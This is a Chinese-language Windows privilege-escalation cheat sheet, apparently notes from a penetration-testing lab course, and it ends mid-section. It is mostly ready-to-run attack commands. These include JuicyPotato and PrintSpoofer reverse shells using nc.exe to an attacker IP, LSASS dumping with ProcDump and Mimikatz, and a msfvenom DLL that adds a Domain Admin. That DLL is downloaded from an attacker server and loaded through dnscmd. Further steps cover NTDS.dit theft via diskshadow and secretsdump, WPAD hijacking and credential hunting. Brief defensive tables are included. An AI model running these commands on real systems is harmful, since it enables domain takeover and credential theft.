# Windows 權限提升

**🔍 1. 資訊收集**

| 指令                                                                                                             | 檢查點（進階姿勢）                                                                                                                                                                                                                                                                                                                      | 若發現目標                                                         | 下一步行動                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <p></p><ol><li><mark style="color:red;">初始存取（Exploit 漏洞打進機器）</mark></li></ol>                                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `systeminfo`                                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#windows-kernel-exploits-nei-he-lou-dong-ti-quan](windows-quan-xian-ti-sheng.md#windows-kernel-exploits-nei-he-lou-dong-ti-quan "mention")                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `wmic product get name`                                                                                        | 掃描應用程式是否存在弱點（如 Java 6、Flash、老版 7-Zip、TeamViewer）                                                                                                                                                                                                                                                                               | 是                                                             | 查 CVE，準備特定 Exploit 或利用 DLL Hijacking                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 使用 msfvenom 生成惡意 MSI 並建立反向連線                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian](windows-quan-xian-ti-sheng.md#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian "mention")                                                                                                                                                                                                                                                                                                                                                                                   |
| <p></p><ol start="2"><li><mark style="color:red;">權限提升（提升為 SYSTEM / Administrator）</mark></li></ol>            |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `whoami /priv`                                                                                                 | <mark style="color:red;">SeImpersonate</mark> / <mark style="color:red;">SeAssignPrimaryToken</mark> / <mark style="color:red;">SeDebugPrivilege</mark> /  <mark style="color:red;">SeTakeOwnershipPrivilege</mark> /<mark style="color:red;">SeBackupPrivilege</mark> /<mark style="color:red;">SeLoadDriverPrivilege</mark>  | 存在                                                            | [#seimpersonate-and-seassignprimarytoken-gong-ji](windows-quan-xian-ti-sheng.md#seimpersonate-and-seassignprimarytoken-gong-ji "mention")[#sedebugprivilege-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#sedebugprivilege-quan-xian-ti-quan-gong-ji "mention")[#setakeownership-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#setakeownership-quan-xian-lan-yong-gong-ji "mention")  [#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong "mention")/ |
| `net local "Event Log Readers"`                                                                                | 顯示自己的名字                                                                                                                                                                                                                                                                                                                        |                                                               | [#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji](windows-quan-xian-ti-sheng.md#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ADGroupMember -Identity DnsAdmins`                                                                        | 顯示自己的名字                                                                                                                                                                                                                                                                                                                        |                                                               | [#dnsadmins-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#dnsadmins-quan-xian-lan-yong-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `Get-LocalGroupMember -Group "Hyper-V Administrators"`                                                         | 顯示自己的名字                                                                                                                                                                                                                                                                                                                        |                                                               | [#hyperv-administrators-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#hyperv-administrators-quan-xian-li-yong "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`          | <p><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</code><br></p>                                                                                                                                                                                   | <p>如果是 <code>0x2</code> 或 <code>0x0</code>，恭喜，非常容易利用！<br></p> | [#user-account-controluac-rao-guo](windows-quan-xian-ti-sheng.md#user-account-controluac-rao-guo "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `.\SharpUp.exe audit`                                                                                          | 找 `Modifiable Service Binaries`、`Modifiable Services` 或 `Modifiable Registry Keys`                                                                                                                                                                                                                                             | 是                                                             | [#ruo-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#ruo-quan-xian-ti-quan-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| <p></p><ol start="3"><li><mark style="color:red;">憑證擷取（Dump SAM、LSASS、Security Hive 等）</mark></li></ol>        |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| 憑證獵殺                                                                                                           |                                                                                                                                                                                                                                                                                                                                |                                                               | [#ping-zheng-lie-sha](windows-quan-xian-ti-sheng.md#ping-zheng-lie-sha "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `net localgroup "Event Log Readers"`                                                                           | 有帳號存在 -> 可無需提權查看安全日誌，例如登入事件4624                                                                                                                                                                                                                                                                                                | 是                                                             | 嘗試讀取安全日誌，觀察高權限帳號活動或登入來源                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`                                                  | 快速搜尋敏感檔案，針對 config 設定、密碼備註等                                                                                                                                                                                                                                                                                                    | 有密碼關鍵字                                                        | 嘗試登入 SMB、RDP、AD、VPN 等外部資源                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `gc 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'`                 | 使用者自訂詞典，常用於自定義拼字，可為密碼字典來源                                                                                                                                                                                                                                                                                                      | 有詞彙                                                           | 擴充字典進行暴力破解或社工口令組合                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,unattend.xml.bak -ErrorAction SilentlyContinue`        | 搜尋系統自動化部署檔，常見於 AD join 或本地帳號配置                                                                                                                                                                                                                                                                                                 | 有檔案                                                           | 解析明文帳密，執行本地或橫向登入                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `gc (Get-PSReadLineOption).HistorySavePath`                                                                    | PowerShell 使用歷史，會留有憑證、命令、IP 等行為痕跡                                                                                                                                                                                                                                                                                              | 有敏感內容                                                         | 重複利用命令、憑證、服務指令構建 lateral pivoting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `findstr /SI /M "password" *.txt *.ini *.cfg *.config *.xml`                                                   | 多點位掃描用戶文件夾與備份                                                                                                                                                                                                                                                                                                                  | 有內容                                                           | 嘗試登入其他服務或雲端資源                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `Select-String -Path C:\Users\*\Documents\*.txt -Pattern "password"`                                           | 精準搜尋 Documents 內部檔案，有較高命中率                                                                                                                                                                                                                                                                                                     | 有發現                                                           | 做憑證爆破或橫向移動測試                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `%SYSTEMDRIVE%\pagefile.sys`                                                                                   | 交換記憶體檔案，可能保有歷史密碼、明文資訊                                                                                                                                                                                                                                                                                                          | 可取得                                                           | 用 volatility 分析記憶體，找帳密或 hash、token 等敏感資訊                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `cmdkey /list`                                                                                                 | Windows 儲存的憑證快取，可供 runas 調用                                                                                                                                                                                                                                                                                                    | 有憑證紀錄                                                         | 使用 `runas /savecred` 重複登入，靜默使用憑證攻擊                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `%WINDIR%\debug\NetSetup.log`                                                                                  | Windows AD 加入記錄，可能含帳號或建立者資訊                                                                                                                                                                                                                                                                                                    | 可見                                                            | 推估 AD 管理者行為、找通用憑證線索                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `%WINDIR%\system32\config\security.sav`                                                                        | 備份登錄檔，含安全性策略與權限資訊                                                                                                                                                                                                                                                                                                              | 可取得                                                           | 做離線 Registry 分析，找 SID / ACL 或權限設定                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| <p></p><ol start="4"><li><mark style="color:red;">密碼破解（Hashcat / John 等離線攻擊）</mark></li></ol>                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `C:\ProgramData\Configs*`                                                                                      | 常用為自訂軟體的儲存位置，含明文帳密或 token                                                                                                                                                                                                                                                                                                      | 有設定檔                                                          | 尋找帳密設定或備份，橫向攻擊新目標                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `sudo responder -wrf -v -I tun0`                                                                               | 捕獲 NTLM Hash：如 SMB Relay、WPAD、HTTP 基於 LAN 攔截                                                                                                                                                                                                                                                                                   | 取得 hash                                                       | 使用 hashcat / john 破解或 pass-the-hash 利用                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `%USERPROFILE%\ntuser.dat`                                                                                     | 使用者行為分析登錄檔，可含自動登入帳密、自動啟動項等                                                                                                                                                                                                                                                                                                     | 可取                                                            | 分析使用者行為紀錄與憑證痕跡、Persist 構建依據                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| <p></p><ol start="5"><li><mark style="color:red;">👉【橫向移動】：使用擷取的憑證去登入別的主機（RDP、SMB、WMI、Psexec）</mark></li></ol> |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| <p>如果可以使用admin 開啟cmd.exe</p><p></p><p>reg save HKLM\SAM C:\sam.save </p>                                       | 成功                                                                                                                                                                                                                                                                                                                             |                                                               | SAM 攻擊                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| <p></p><ol start="6"><li><mark style="color:red;">機密提取 / 控制權奪取 / 攻擊橫向擴張</mark></li></ol>                       |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `net use`                                                                                                      | 列出網路磁碟掛載、憑證綁定、AD 使用紀錄                                                                                                                                                                                                                                                                                                          | 有磁碟掛載                                                         | 掃描共用資料夾找憑證、內部資源與 Payload 放置點                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `netsh wlan show profile`                                                                                      | 檢查無線網路清單                                                                                                                                                                                                                                                                                                                       | 有 Wi-Fi 設定檔                                                   | 下一步使用 key=clear 取出密碼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| `netsh wlan show profile <ProfileName> key=clear`                                                              | 顯示明文 Wi-Fi 密碼                                                                                                                                                                                                                                                                                                                  | 密碼出現                                                          | 進行無線網路滲透（無線中繼、偽 AP 攻擊）                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

## **🚀 2.** 權限提升

<details>

<summary>SeImpersonate and SeAssignPrimaryToken 攻擊</summary>

### 🏢 公司化比喻

* SeImpersonatePrivilege = 「臨時扮 CEO 身份證 🕴️」
* SeAssignPrimaryTokenPrivilege = 「可以幫別人發 CEO 印章 🪪」
* 攻擊者只要有這權限，就可以開個假窗口（Pipe）等 CEO（SYSTEM）自己上門送權限印章！

### 攻擊流程總覽圖

```
[1️⃣ 已滲透低權限 (Service Account)]  
     │  
     ↓  
[2️⃣ 執行 whoami /priv 確認有 SeImpersonate / SeAssignPrimaryToken]  
     │  
     ↓  
[3️⃣ 利用工具建立 COM Pipe（釣 SYSTEM）  
     │  
     ↓  
[4️⃣ SYSTEM 連線 & token 洩露  
     │  
     ↓  
[5️⃣ 工具捕獲 SYSTEM token  
     │  
     ↓  
[6️⃣ 透過 token 打開 SYSTEM shell  
     │  
     ↓  
[7️⃣ 成功取得 SYSTEM 權限  
     │  
     ↓  
[8️⃣ 橫向移動 / Dump Hash / 控制域控]  
```

***

### 🧑‍💻 **攻擊指令模板：**

**第一步**

```cmd
 whoami /priv
```

#### 第二部 --> 選擇其中一種攻擊方法 **JuicyPotato /  PrintSpoofer (請使用文件上傳)**

#### ✅ 🔸 **JuicyPotato（適用 Windows Server 2016 / Win10 1803 以下）**

```bash
JuicyPotato.exe -l 5555 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <你的IP> <你的PORT> -e cmd.exe" -t *
```

| 參數    | 用途                                                    |
| ----- | ----------------------------------------------------- |
| -l    | 本地偽 COM 釣魚端口 (可自訂，例如 5555)                            |
| -p    | 要用 SYSTEM 權限執行嘅程式 (建議 c:\windows\system32\cmd.exe)    |
| -a    | 給執行檔傳遞的參數（反彈 shell 命令）                                |
| -t \* | 同時測試 CreateProcessWithTokenW 同 CreateProcessAsUser 模式 |

***

#### ✅ 🔸 **PrintSpoofer（適用 Windows 10 1809+ / Server 2019+）**

```bash
PrintSpoofer.exe -c "c:\tools\nc.exe <你的IP> <你的PORT> -e cmd.exe"
```

| 參數 | 用途                           |
| -- | ---------------------------- |
| -c | 用 SYSTEM 權限執行命令（反彈 shell 指令） |

***

### 🔎 **在本機監聽：**

```bash
nc -lvnp <你的PORT>
```

當反彈成功，你會見到：

```
connect to [你的IP] from (目標機IP)
Microsoft Windows [Version ...]
C:\Windows\system32> whoami
nt authority\system
```

***

### 🚦 **提示：**

| 環境                             | 推薦工具                       |
| ------------------------------ | -------------------------- |
| Windows 10 / Server 2019 以下    | JuicyPotato                |
| Windows 10 1809 / Server 2019+ | PrintSpoofer / RoguePotato |

***

</details>

<details>

<summary>SeDebugPrivilege 權限提權攻擊</summary>

### 🎯 SeDebugPrivilege 概念

**SeDebugPrivilege** = 公司入面 **「超級內控稽核員 🎯🕵️‍♂️」**

* 本質：擁有檢查、操控系統任何進程嘅權限
* 比喻：\
  你唔一定係 CEO（系統管理員），但你係特別授權嘅「審計專員」，\
  可以隨時打開老闆房間、抄寫內部文件（存取其他進程記憶體）

***

### 🔥 攻擊用途

| 利用方式       | 公司化比喻 🏢                                |
| ---------- | --------------------------------------- |
| Dump LSASS | 偷走系統記憶體中所有帳號密碼（翻開老闆保險箱抄資料 📂）           |
| 提權為 SYSTEM | 偽裝成 SYSTEM ，用「調用上司的簽名印章」打開 SYSTEM shell |
| 針對特定進程進行注入 | 修改系統行為（進程記憶體內改資料，等於竄改文件 ✏️）             |

***

### ✅ 攻擊流程圖

```
[1️⃣ 擁有 SeDebugPrivilege 帳戶]  
     │  
     ↓  
[2️⃣ whoami /priv 檢查確認權限]  
     │  
     ↓  
[3️⃣ Dump LSASS 記憶體 (ProcDump / TaskMgr)]  
     │  
     ↓  
[4️⃣ 將 dump 檔搬回本機]  
     │  
     ↓  
[5️⃣ 用 Mimikatz sekurlsa::minidump 分析]  
     │  
     ↓  
[6️⃣ 拿到 NTLM hash / 明文密碼]  
     │  
     ↓  
[7️⃣ 橫向移動 (PTH / 登入其他主機)]  
```

***

### 🛠️ 攻擊指令範例

#### ✅ 1️⃣ 用 **ProcDump** dump LSASS (使用文件上傳攻擊)

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

\| -ma | 代表 Full memory dump （包含所有敏感資訊） |

***

#### ✅ 2️⃣&#x20;

* 隨後，學生需要將 `lsass.dmp` 檔案複製到 `C:\Tools\Mimikatz\x64` ，導航到同一目錄，然後執行 `mimikatz.exe` ：

```cmd
copy lsass.dmp C:\Tools\Mimikatz\x64\
cd C:\Tools\Mimikatz\x64\
mimikatz.exe
```

***

#### ✅ 3️⃣ 使用 **Mimikatz** 讀取 LSASS Dump (Mimikatz 使用文件上傳)

```cmd
mimikatz.exe
```

然後執行：

```mimikatz
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

➡ 即可取得密碼 / NTLM Hash / 登入 session

***

</details>

<details>

<summary>SeTakeOwnership 權限濫用攻擊</summary>



### 🏢 公司化概念

* **SeTakeOwnershipPrivilege** = 「公司內部資產可強制接管權 🪪」
* 你唔一定係老細，但獲得咗「可以強行搶過其他部門文件櫃擁有權」嘅權利；
* 然後你就可以打開原本無法開啟的密碼箱、設定文件、機密目錄。

***

### 🚀 攻擊流程圖

```
1️⃣ 獲得 Service / 特權用戶（有 SeTakeOwnershipPrivilege）]  
     │  
     ↓  
[2️⃣ 找目標檔案（例如 cred.txt / web.config / KeePass 檔案）]  
     │  
     ↓  
[3️⃣ 使用 takeown 改變該檔案所有權 🪪]  
     │  
     ↓  
[4️⃣ 修改 ACL 權限 (icacls) → 給自己 Full Control]  
     │  
     ↓  
[5️⃣ 讀取敏感資訊（帳密 / 密鑰 / 憑證）📂]  
     │  
     ↓  
[6️⃣ 利用帳密 / hash 進行橫向移動 / 提權 🔓]
```

***

### 🧩 攻擊步驟 + 指令

#### ✅ 第一步：確認權限

```powershell
whoami /priv
```

➡ 確認有 `SeTakeOwnershipPrivilege`

`如果是有，但是沒有啟用可以跟隨以下指令 (需要文件上傳)`&#x20;

```powershell
PS C:\Windows\system32> cd  C:\Tools
PS C:\Tools> Import-Module .\Enable-Privilege.ps1
PS C:\Tools> .\EnableAllTokenPrivs.ps1
```

然後，學生需要再次檢查使用者權限，查看 `SeTakeOwnershipPrivilege` 是否已啟用：

***

#### ✅ 第二步：目標物件範例

* 常見可以利用檔案：

```
C:\inetpub\wwwroot\web.config
C:\Department Shares\Private\IT\cred.txt
%WINDIR%\repair\sam
.kdbx（KeePass 資料庫）
```

***

#### ✅ 第三步：接管所有權

```powershell
takeown /f "C:\路徑\目標檔案.txt"
```

* 成功會顯示：

```
SUCCESS: The file "xxx" now owned by user "domain\user".
```

***

#### ✅ 第四步：修改 ACL 權限

```powershell
icacls "C:\路徑\目標檔案.txt" /grant <用戶名稱>:F
```

* F = Full control

***

#### ✅ 第五步：讀取敏感資訊

```powershell
type "C:\路徑\目標檔案.txt"
或
Get-Content "C:\路徑\目標檔案.txt"
```

***

### 🎓 延伸利用

* 搭配 GPO 權限濫用：用 SharpGPOAbuse 指派 SeTakeOwnership 權限給自己
* 接管登錄機碼（registry keys）：

```powershell
takeown /f "HKLM:\Software\..."
icacls "HKLM:\Software\..." /grant <username>:F
```

* 接管服務（services），然後修改 Binary Path 以提權

</details>

<details>

<summary>SeBackupPrivilege 權限濫用攻擊</summary>

### 🏢 公司化概念

* **Backup Operators 群組** = 公司「備份部門人員 👩‍💻」
* 呢個部門本來職責係：就算冇權限都可以備份所有文件（因為備份唔能阻止）
* 攻擊者只要成為 Backup Operator，就等於可以走後門將任何檔案「偷偷搬出公司 🗄️」

***

### 🚀 攻擊流程圖

```
[1️⃣ 拿到 Backup Operators 群組帳戶 (或 SeBackupPrivilege 權限)]  
     │  
     ↓  
[2️⃣ whoami /priv 確認 SeBackupPrivilege & SeRestorePrivilege]  
     │  
     ↓  
[3️⃣ Import DLL 工具 / 使用 PowerShell Cmdlet]  
     │  
     ↓  
[4️⃣ 開啟 SeBackupPrivilege 權限 (Set-SeBackupPrivilege)]  
     │  
     ↓  
[5️⃣ 使用 Copy-FileSeBackupPrivilege / robocopy / diskshadow 複製敏感檔案]  
     │  
     ↓  
[6️⃣ 獲取 NTDS.dit / SYSTEM / SAM / web.config 等檔案]  
     │  
     ↓  
[7️⃣ 離線用 secretsdump.py / DSInternals 提取 AD 密碼雜湊]  
     │  
     ↓  
[8️⃣ Pass-the-Hash / Crack / 橫向滲透]  
```

***

### 👨‍🏫 攻擊步驟範例

#### ✅ 第一步：檢查群組 / 權限

```powershell
whoami /groups
whoami /priv
```

確認有 `SeBackupPrivilege` & `SeRestorePrivilege`

***

#### ✅ 第二步：開啟備份權限 (如果係disable  需要文件上傳)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
```

***

d

#### ✅ 第三步：用 Cmdlet 搶複受保護檔案

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

***

#### 下面如果冇需要可以唔使用

#### ✅ 第四步：Diskshadow 搶複 NTDS.dit

```cmd
diskshadow
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

然後在 E: 抄 NTDS.dit

***

#### ✅ 第五步：用 robocopy (備份模式 B flag)

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

***

#### ✅ 第六步：用 secretsdump.py 離線提 hash

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

拿到所有 domain user hash，並可 Pass-The-Hash 進行橫向攻擊。

***

### ⚠ 藍隊防守提示

| 防守行動                                                     | 原因                                                |
| -------------------------------------------------------- | ------------------------------------------------- |
| 嚴格審查 Backup Operators / DnsAdmins / Print Operators 群組成員 | 這些群組成員可非管理員狀態下執行高敏感行為                             |
| 禁止測試後殘留帳戶                                                | 經常出現測試完剩下的帳戶意外保留 Backup Operator 權限               |
| 設置監控                                                     | 針對 diskshadow / robocopy / reg save 等關鍵行為應監控並產生告警 |

</details>

<details>

<summary>Event Log Readers 權限濫用敏感命令行擷取攻擊</summary>

### 🏢 公司化概念

* **Event Log Readers** = 「公司稽核室🗄️讀取權限組」
* 本質上：雖然唔係 IT Admin，但有權打開「公司行為黑盒子 📂」
* 可以翻閱所有日誌，包括誰開咗咩程式、咩指令行（Command line audit）

***

### 🚀 攻擊流程圖

```
[1️⃣ 拿到 Event Log Readers 權限 or 找到有此權限帳號]  
     │  
     ↓  
[2️⃣ 利用 wevtutil / Get-WinEvent 查閱 4688 事件記錄]  
     │  
     ↓  
[3️⃣ 搜索包含敏感參數（如 /user、net use、wmic、tasklist）]  
     │  
     ↓  
[4️⃣ 擷取出明文帳號密碼、指令列歷史（例：net use /user:tim 密碼）]  
     │  
     ↓  
[5️⃣ 應用收集到的帳密進行橫向滲透 / 提權 / 網域存取]  
```

***

### 👨‍🏫 攻擊指令範例

✅ 開啟 PowerShell 並檢查哪些使用者在 `Event Log Readers` 群組中：

```powershell
net localgroup "Event Log Readers"
```

#### ✅ wevtutil 檢索安全日誌

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

> 找出所有在指令列裡出現 `/user` 的命令行紀錄
>
> 從命令的輸出中，學生會知道 `mary` 用戶的密碼是 `W1ntergreen_gum_2021!` 。

***

#### ✅ wevtutil 使用其他憑證

```cmd
wevtutil qe Security /rd:true /f:text /r:<目標主機> /u:<用戶> /p:<密碼> | findstr "/user"
```

> 可遠程或用不同身份連上去查

***

#### ✅ PowerShell Get-WinEvent 檢索 4688

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> 專門針對「有 /user」參數的敏感指令
>
> ***

***

### 💡 例子：可以抓到什麼？

```
Process Command Line: net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

➡ 就可以無聲無息拿到明文密碼 🔓

***

### ⚠ 防禦方建議

| 防守行動                                         | 原因                                    |
| -------------------------------------------- | ------------------------------------- |
| 僅授權 Event Log Readers 給可信帳戶                  | 該權限可用來擷取所有行為紀錄，包含明文密碼，極高敏感度           |
| 開啟 PowerShell Script Block Logging 並發送至 SIEM | 可補捉 PowerShell 記錄，避免被濫用               |
| 設定 AppLocker / WDAC                          | 禁止可疑用戶使用 wevtutil / PowerShell 敏感操作行為 |
| 監控 4688 中高敏感命令（tasklist、net use、ipconfig）    | 從非技術崗位主機執行這些指令要立即警報                   |

</details>

<details>

<summary>DnsAdmins 權限濫用攻擊</summary>

### 🏢 **公司化概念**

* **DnsAdmins 群組** = 公司內部「DNS 管理部門 🏢」
* 這群人負責維護 **DNS 伺服器**，但 Windows 給他們的權限太大 🚀
* **攻擊者只要成為 DnsAdmins，就可以拿下 SYSTEM 權限 💀**

***

### 🚀 **攻擊流程圖**

```
[1️⃣ 獲取 DnsAdmins 權限帳號（可透過網路釣魚 / Hash 攻擊取得）]  
     │  
     ↓  
[2️⃣ 確認 DnsAdmins 群組身份（Get-ADGroupMember DnsAdmins）]  
     │  
     ↓  
[3️⃣ 利用 dnscmd 設置 ServerLevelPluginDll，掛載惡意 DLL]  
     │  
     ↓  
[4️⃣ 重新啟動 DNS 服務（sc stop dns && sc start dns）]  
     │  
     ↓  
[5️⃣ 成功執行惡意 DLL，可取得 SYSTEM 權限或反向 shell]  
     │  
     ↓  
[6️⃣ 利用 SYSTEM 權限 Dump LSASS / Pass-the-Hash 進行橫向移動]  
```

***

### 👨‍🏫 **攻擊步驟範例**

#### ✅ **第一步：確認 DnsAdmins 權限**

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

* 確認當前帳號是否屬於 **DnsAdmins** 群組。

***

#### ✅ **第二步：產生惡意 DLL**

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

* **此 DLL 會自動將帳號 `netadm` 加入 Domain Admins 群組。**

***

#### &#x20;✅  啟動一個 Python HTTP 伺服器 Pwnbox/ `PMVPN`

```shell-session
python3 -m http.server 7777
```

#### ✅ **第三步：上傳惡意 DLL 到目標**

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "C:\Users\netadm\Desktop\adduser.dll"
```

* **將惡意 DLL 下載至目標機器上。**

***

#### ✅ **第四步：配置 ServerLevelPluginDll**&#x20;

#### 需要打開命令提示字元並載入惡意 `.dll`&#x20;

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* **此命令會將我們的惡意 DLL 設為 DNS 伺服器的 Plugin。**

***

#### ✅ **第五步：重新啟動 DNS 服務**

```cmd
sc stop dns && sc start dns
```

* **這將會讓 DNS 服務加載我們的惡意 DLL，執行惡意命令。**

***

#### ✅ **第六步：驗證提權是否成功**

```cmd
net group "Domain Admins" /domain
```

* **如果看到 `netadm` 出現在 Domain Admins 內，攻擊成功！🎉**

***

### 💡 **延伸利用：利用 WPAD 劫持內網流量**

#### **👉 WPAD 劫持攻擊**

* **DnsAdmins 還可以設置 DNS 記錄，來進行 WPAD 攻擊，劫持內網 HTTP / SMB 流量。**

```cmd
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

* **此操作會將內部所有使用預設 WPAD 設定的電腦指向攻擊者機器。**
* **然後，攻擊者可以用 Responder 或 Inveigh 進行 SMB Relay 攻擊，獲取 NTLM Hash！**

***

### ⚠ **藍隊防禦建議**

| 防禦措施                                    | 原因                                      |
| --------------------------------------- | --------------------------------------- |
| **最小化 DnsAdmins 成員**                    | 只允許必要人員擁有此權限，並定期審查成員是否有異常變動。            |
| **監控 dnscmd / ServerLevelPluginDll 設置** | 檢測異常 DNS 配置變更，應用 SIEM 記錄變更行為。           |
| **限制 WPAD / 禁用 LLMNR / NBT-NS**         | 防止 WPAD 劫持與內部流量轉發攻擊，避免內部 Hash 洩露。       |
| **設定 AppLocker 限制 DLL 加載**              | 防止非信任 DLL 被加載到系統服務，減少 DLL Injection 風險。 |

</details>

<details>

<summary>Hyper-V Administrators 權限利用</summary>

#### 🏢 攻擊目標概念：

Hyper-V Administrators（虛擬機管理員）群組擁有 Hyper-V 全功能控制權。

> 若域控（Domain Controller）被虛擬化，Hyper-V 管理員可透過虛擬磁碟檔（VHDX）輕鬆複製並離線掛載來提取 `NTDS.dit`（域中所有用戶的密碼 hash 倉庫）。\
> 🔎 結論：Hyper-V Admin = 潛在的 Domain Admin！

***

### 🌟 公司化 + emoji 攻擊流程圖

```
🎯 確認是否為 Hyper-V 管理員
│
├─> 🛠️ 工具：
│   - PowerShell：Get-LocalGroupMember -Group "Hyper-V Administrators"
│   - CMD：net localgroup "Hyper-V Administrators"
│
├─> ✅ 出現自己帳戶 ➡ 擁有 Hyper-V Admin 權限！
│
├─> 📦 發現域控 VM
│
├─> 📁 複製域控的 VHDX 檔
│
├─> 💻 離線掛載 VHDX
│
├─> 🔍 提取 NTDS.dit + SYSTEM hive
│
├─> 🧰 使用 secretsdump.py 取得所有域帳號 hash
│
├─> 🛡️ 使用 pass-the-hash、crack hash，或直接域控登入
│
└─> 🎉 成功取得 Domain Admin 權限！
```

***

### 📝 公司化詳細步驟

#### ➡ 1️⃣ 確認是否有 Hyper-V Admin 權限

```powershell
Get-LocalGroupMember -Group "Hyper-V Administrators"
```

✅ 輸出範例：

```
Name          ObjectClass
----          -----------
pentester     User
```

> ➡ 看到自己帳號就代表可以繼續行動！

***

#### ➡ 2️⃣ 查看域控虛擬機器路徑 📁

* 一般位於：

```
C:\ProgramData\Microsoft\Windows\Hyper-V\Virtual Machines\
```

* 找到 VHDX 路徑或 .vmcx 配置檔案內的虛擬磁碟路徑。

***

#### ➡ 3️⃣ 複製出 VHDX 檔案 🗃️

```powershell
Copy-Item "C:\HyperV\DC01\DC01.vhdx" "C:\Temp\DC01_copy.vhdx"
```

***

#### ➡ 4️⃣ 掛載虛擬磁碟 💻

```powershell
